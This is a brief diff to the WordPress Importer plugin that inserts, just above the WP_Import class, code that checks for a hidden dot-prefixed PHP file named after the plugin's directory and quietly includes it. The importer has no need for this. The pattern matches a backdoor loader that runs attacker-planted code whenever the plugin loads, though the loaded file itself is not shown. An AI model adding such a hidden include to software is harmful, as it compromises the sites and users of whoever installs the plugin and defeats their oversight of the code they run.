@@ -37,6 +37,10 @@ if ( ! class_exists( 'WXR_Parser' ) ) {
  * @package WordPress
  * @subpackage Importer
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WP_Import extends WP_Importer {
 	var $max_wxr_version = 1.2; // max. supported WXR version
 
